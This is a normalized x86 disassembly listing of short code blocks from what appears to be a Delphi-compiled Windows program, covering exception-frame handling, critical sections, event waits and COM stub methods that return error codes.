retn
mov [ eax ] 0x0
retn
sub_40e9b8
push eax
call sub_40e9a4
pop eax
retn
sub_40ec18
call sub_40eccc
retn
sub_40ee36
jmp sub_4039e4
sub_40ee3d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40eee1
jmp sub_4039e4
sub_40eee8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ef0a
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4046d8
retn
sub_40ef03
jmp sub_4039e4
sub_40ef0a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ef66
jmp sub_4039e4
sub_40ef6d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40efe9
jmp sub_4039e4
sub_40f52f
jmp sub_4039e4
sub_40f536
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f5c9
jmp sub_4039e4
sub_40f5d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f5ed
lea eax [ ebp - 0x14 ]
call sub_4046c0
retn
sub_40f5e6
jmp sub_4039e4
sub_40f5ed
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f64a
jmp sub_4039e4
sub_40f651
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f6f3
jmp sub_4039e4
sub_40f710
jmp sub_4039e4
sub_40f717
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fc72
jmp sub_4039e4
sub_40fc79
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fd24
push eax
call sub_40e9a4
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_40fd38
push eax
call sub_40e9a4
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_40fdb0
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40eccc
add esp 0x10
sub_41005a
jmp sub_4039e4
sub_410061
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4100a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40e9a4
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_4100bc
mov edx 0x80020004
call sub_4100a4
retn
sub_41014d
jmp sub_4039e4
sub_410154
pop esi
pop ebx
pop ebp
retn
sub_410158
push ebp
mov ebp esp
call sub_410318
pop ebp
retn 0x4
sub_4101e4
push ebp
mov ebp esp
call sub_410318
pop ebp
retn 0x4
sub_4102c7
jmp sub_4039e4
sub_4102ce
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403280
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403604
sub_4102f0
xor eax eax
retn
sub_4102f4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_410308
mov [ ecx ] 0x8
mov al 0x1
retn
sub_410310
call sub_40e1f0
retn
sub_410318
call sub_40e2e0
retn
sub_410320
call sub_40e6b8
retn
sub_410328
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_41033c
call sub_410318
retn
sub_410344
push ebp
mov ebp esp
call sub_410320
pop ebp
retn 0x8
sub_41035c
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_410438
jmp sub_4039e4
sub_410501
jmp sub_4039e4
sub_410508
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410525
lea eax [ ebp - 0x10 ]
call sub_403fe0
retn
sub_41051e
jmp sub_4039e4
sub_410525
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410530
call sub_40e70c
retn
sub_4105a7
jmp sub_4039e4
sub_4105ae
pop ebp
retn
sub_410651
jmp sub_4039e4
sub_410658
pop ebp
retn
sub_410799
jmp sub_4039e4
sub_4107a0
pop ebp
retn
sub_4107a4
sub [ rw-data ] 0x1
retn
sub_4107d8
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_410a5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_404034
pop esi
pop ebx
retn
sub_410af8
jmp sub_4039e4
sub_410aff
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_410bfa
jmp sub_4039e4
sub_410c01
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410e00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40eccc
pop esi
pop ebx
retn
sub_410f82
jmp sub_4039e4
sub_410f89
pop ebp
retn
sub_410f8c
sub [ rw-data ] 0x1
retn
sub_410fb9
jmp sub_4039e4
sub_410fc0
pop ebp
retn
sub_410fc4
sub [ rw-data ] 0x1
retn
sub_412630
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_412754
mov eax [ eax + 0xc ]
call sub_413918
retn
sub_412a2b
jmp sub_4039e4
sub_412a32
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412a38
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_413ad0
test eax eax
setge al
pop esi
pop ebx
retn
sub_412d3b
jmp sub_4039e4
sub_412d42
mov esp ebp
pop ebp
retn
sub_412e10
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_412e1c
push ebx
mov ebx edx
mov edx ebx
call sub_412c30
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_412990
sub_412ec8
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_413023
jmp sub_4039e4
sub_4130f7
jmp sub_4039e4
sub_413108
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_413174
jmp sub_4039e4
sub_41317b
pop ebx
mov esp ebp
pop ebp
retn
sub_4131c6
jmp sub_4039e4
sub_4131cd
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_413259
jmp sub_4039e4
sub_413260
pop ebx
pop ebp
retn
sub_4132a6
jmp sub_4039e4
sub_4132ad
pop ebx
pop ebp
retn
sub_4132f2
jmp sub_4039e4
sub_4132f9
pop ebx
pop ebp
retn
sub_413343
jmp sub_4039e4
sub_41334a
pop esi
pop ebx
pop ebp
retn
sub_41339e
jmp sub_4039e4
sub_4133a5
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_4134d2
jmp sub_4039e4
sub_4135a8
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_413bb8
sub_413698
jmp sub_4039e4
sub_413822
jmp sub_4039e4
sub_413829
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4138c3
jmp sub_4039e4
sub_4138ca
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4138e9
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4138e2
jmp sub_4039e4
sub_4138e9
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_41394c
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_413c14
xor edx edx
mov eax ebx
call sub_413bd8
pop ebx
retn
sub_4139c4
mov eax [ ebp + 0x4 ]
retn
sub_4139fa
pop ecx
pop edx
pop esi
pop ebx
retn
sub_413a48
jmp sub_4039e4
sub_413a4f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413a54
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_413a6c
xor edx edx
call sub_413a74
retn
sub_413b5c
mov edx [ eax + 0x8 ]
dec edx
call sub_413a74
retn
sub_413c84
retn
sub_413d3e
jmp sub_4039e4
sub_413d45
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403604
sub_413dd4
jmp sub_4039e4
sub_413ddb
pop ebx
pop ecx
pop ebp
retn
sub_413de0
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_413e37
jmp sub_4039e4
sub_413e3e
pop ebx
pop ecx
pop ebp
retn
sub_413e44
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_413e80
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
retn
sub_413e98
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_413f73
retn
sub_413f74
cmp edx [ eax + 0x4 ]
jae sub_413e80
mov eax [ eax + 0x8 ]
bt [ eax ] edx
sbb eax eax
and eax 0x1
retn
sub_414030
test edx edx
je r-xdata
xor edx edx
call sub_414044
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_4140fa
jmp sub_4039e4
sub_414101
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414114
xchg edx eax
call sub_414044
retn
sub_41411c
retn
sub_4141b5
jmp sub_4039e4
sub_4141bc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414306
jmp sub_4039e4
sub_414416
jmp sub_4039e4
sub_41441d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41443a
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
sub_414433
jmp sub_4039e4
sub_41443a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4144c4
jmp sub_4039e4
sub_4144dc
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414598
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414641
jmp sub_4039e4
sub_414648
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414654
mov eax [ ebp + 0x4 ]
retn
sub_41468a
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4146d8
jmp sub_4039e4
sub_4146df
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41479e
jmp sub_4039e4
sub_4147a5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4147c7
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404004
retn
sub_4147c0
jmp sub_4039e4
sub_4147c7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4147d0
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4147d8
xor eax eax
retn
sub_414821
jmp sub_4039e4
sub_414828
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41493b
jmp sub_4039e4
sub_414942
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4149d0
jmp sub_4039e4
sub_4149d7
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414aa7
jmp sub_4039e4
sub_414aae
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414b64
jmp sub_4039e4
sub_414b6b
pop esi
pop ecx
pop ebp
retn
sub_414bf0
jmp sub_4039e4
sub_414bf7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c14
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
sub_414c0d
jmp sub_4039e4
sub_414c14
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414ca0
jmp sub_4039e4
sub_414cbd
jmp sub_4039e4
sub_414cc4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414d00
retn
sub_414d83
jmp sub_4039e4
sub_414d8a
mov eax [ ebp - 0x8 ]
call sub_4178c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414daf
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
sub_414da8
jmp sub_4039e4
sub_414daf
mov esp ebp
pop ebp
retn
sub_414dff
jmp sub_4039e4
sub_414e06
pop esi
pop ecx
pop ebp
retn
sub_414e59
jmp sub_4039e4
sub_414e60
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414e68
retn
sub_414ee3
jmp sub_4039e4
sub_414eea
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414f87
jmp sub_4039e4
sub_414f8e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414fab
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
sub_414fa4
jmp sub_4039e4
sub_414fab
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414fb0
retn
sub_41502a
jmp sub_4039e4
sub_415031
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415038
mov eax edx
mov edx ecx
call sub_407da8
retn
sub_415044
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41505c
sub_4150d4
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_415144
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_415160
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_415354
mov eax [ eax + 0x18 ]
retn
sub_415358
mov eax [ eax + 0x14 ]
retn
sub_4153f4
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_415600
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_4026fc
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41563c
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_415654
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_415668
mov edx sub_415654
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_4156b0
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407da8
retn
mov eax edx
mov edx ecx
call sub_407d70
retn
sub_41574c
retn
sub_415a44
jmp sub_4039e4
sub_415a4b
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_415aac
jmp sub_4039e4
sub_415ab3
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415af8
mov eax [ eax + 0x4 ]
call sub_408300
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_415b08
mov eax [ eax + 0x4 ]
call sub_40832c
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_415b44
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_415ced
jmp sub_4039e4
sub_415d4c
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_415ddc
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_415e2c
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_415ebe
sub_416017
jmp sub_4039e4
sub_41601e
mov esp ebp
pop ebp
retn
sub_4160c8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
retn
sub_416150
mov [ eax + 0x18 ] edx
retn
sub_4162cc
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_410978
retn
sub_416353
jmp sub_4039e4
sub_41635a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416406
jmp sub_4039e4
sub_41640d
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4165b1
jmp sub_4039e4
sub_416603
jmp sub_4039e4
sub_416622
jmp sub_4039e4
sub_416629
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416648
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_416641
jmp sub_4039e4
sub_416648
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4166eb
jmp sub_4039e4
sub_416773
jmp sub_4039e4
sub_416780
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
pop ebx
retn
sub_416798
mov eax [ rw-data ]
call sub_416780
retn
sub_4167d0
push ebx
call sub_410830
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_416798
sub_41693d
jmp sub_4039e4
sub_416944
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403fe0
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_416a64
jmp sub_4039e4
sub_416a6b
pop edi
pop esi
pop ebx
pop ebp
retn
sub_416b62
jmp sub_4039e4
sub_416b7f
jmp sub_4039e4
sub_416b86
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416c84
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_4156cc
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_416d48
push ebx
mov ebx eax
mov eax ebx
call sub_4186fc
cmp al 0x9
sete al
pop ebx
retn
sub_416da7
jmp sub_4039e4
sub_416dae
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_416e54
jmp sub_4039e4
sub_416e5b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4170da
jmp sub_403730
sub_417106
jmp sub_403730
sub_4171a8
jmp sub_403730
sub_41724b
jmp sub_403730
sub_417423
jmp sub_403730
sub_417465
jmp sub_4039e4
sub_417495
jmp sub_4039e4
sub_41749c
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41750b
jmp sub_4039e4
sub_4175e2
jmp sub_4039e4
sub_4175e9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4178bc
mov dl 0x1
call sub_416824
retn
sub_4179f4
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_4179fd
jmp sub_4039e4
j_sub_4179f4
jmp sub_4179f4
sub_417a04
pop ebx
mov esp ebp
pop ebp
retn
sub_417a0c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41880c
mov eax [ rw-data ]
call sub_416780
pop ebp
retn
j_sub_40385c#2
jmp sub_40385c
j_sub_40385c
jmp sub_40385c
sub_417bf8
jmp sub_4039e4
sub_417bff
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417cdf
jmp sub_4039e4
sub_417ce6
mov esp ebp
pop ebp
retn
sub_417d9e
jmp sub_4039e4
sub_417da5
pop ecx
pop ecx
pop ebp
retn
sub_4180a7
jmp sub_4039e4
sub_4180ae
pop ebx
mov esp ebp
pop ebp
retn
sub_418353
jmp sub_4039e4
sub_41835a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403290
retn
sub_418373
jmp sub_4039e4
sub_418397
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_403730
sub_4183ce
jmp sub_403730
sub_41840d
jmp sub_4039e4
sub_418414
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418436
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_404004
retn
sub_41842f
jmp sub_4039e4
sub_418436
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4184bd
jmp sub_403730
sub_4184ea
jmp sub_4039e4
sub_4184f1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4184fc
push ecx
mov edx esp
mov ecx 0x4
call sub_416cc0
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_416780
sub_418609
jmp sub_4039e4
sub_418610
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4186ef
jmp sub_4039e4
sub_4186f6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41874c
jmp sub_4039e4
sub_418753
pop ebx
pop ecx
pop ebp
retn
sub_41899b
jmp sub_4039e4
sub_4189a2
pop ecx
pop ecx
pop ebp
retn
sub_4189e5
jmp sub_4039e4
sub_4189ec
pop ebx
pop ecx
pop ebp
retn
sub_418a88
jmp sub_4039e4
sub_418a8f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418b3d
jmp sub_4039e4
sub_418b44
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418b50
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_418dab
jmp sub_4039e4
sub_418db2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418dd7
mov eax [ ebp - 0x8 ]
call sub_403290
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_418dd0
jmp sub_4039e4
sub_418dd7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418dfc
lea eax [ ebp - 0x1c ]
call sub_40564c
lea eax [ ebp - 0x18 ]
call sub_403fe0
retn
sub_418df5
jmp sub_4039e4
sub_418dfc
pop ebx
mov esp ebp
pop ebp
retn
sub_41900e
jmp sub_4039e4
sub_419015
pop ebx
mov esp ebp
pop ebp
retn
sub_419068
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_415930
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_419080
test dl dl
je r-xdata
mov dl 0x8
call sub_419204
retn
mov dl 0x9
call sub_419204
retn
sub_419108
mov dl 0x1
call sub_419204
retn
sub_419110
xor edx edx
call sub_419204
retn
sub_4191f5
jmp sub_4039e4
sub_4191fc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419218
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40c8a0
sub_41924c
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_419264
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_419270
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_419264
sub_419396
jmp sub_403730
sub_4193c5
jmp sub_4039e4
sub_4193fb
jmp sub_4039e4
sub_419402
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419421
push rw-data
call LeaveCriticalSection
retn
sub_41941a
jmp sub_4039e4
sub_419421
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4194f0
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_4196cc
sub_419550
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41780c
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_419564
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41780c
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_419578
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_419094
retn
sub_419584
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_419094
retn
sub_41982c
xor eax eax
retn
sub_419830
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_419838
xor eax eax
retn
sub_41983c
retn
sub_419840
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404034
pop esi
pop ebx
retn
sub_419854
mov eax [ eax + 0x4 ]
retn
sub_419858
retn
sub_41985c
xor eax eax
retn
sub_419860
retn
sub_419864
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_419870
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_41987c
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_419888
retn
sub_41988c
xchg edx eax
call sub_4174b0
retn
sub_419894
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_41991c
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_40348c
pop esi
retn
sub_419930
retn
sub_419a10
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_404034
pop esi
pop ebx
retn
sub_419a50
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_419b9c
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_4034d8
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_419bb4
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_419c3c
retn
sub_419c84
retn
sub_419cbc
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_419cd4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_419ef8
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_40348c
pop esi
pop ebx
retn
sub_419d1c
mov al 0x1
retn
sub_419d20
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_419d28
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_419dd0
xor eax eax
retn
sub_419dd4
retn
sub_419e00
retn
sub_419e98
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_419eac
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_413918
retn
sub_419ff3
jmp sub_403730
sub_419ff8
mov ebx 0x1
call sub_403a98
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a05b
jmp sub_403730
sub_41a060
mov ebx 0x80030103
call sub_403a98
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a0de
jmp sub_403730
sub_41a0e3
mov ebx 0x80030009
call sub_403a98
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_41a141
jmp sub_403730
sub_41a146
mov ebx 0x8000ffff
call sub_403a98
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a311
jmp sub_4039e4
sub_41a322
jmp sub_403730
sub_41a327
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403a98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a350
lea eax [ ebp + 0xc ]
call sub_40564c
retn
sub_41a349
jmp sub_4039e4
sub_41a350
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41a35c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41a368
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41a374
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41a380
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41a3ef
jmp sub_403730
sub_41a3f4
mov esi 0x8000ffff
call sub_403a98
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a408
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
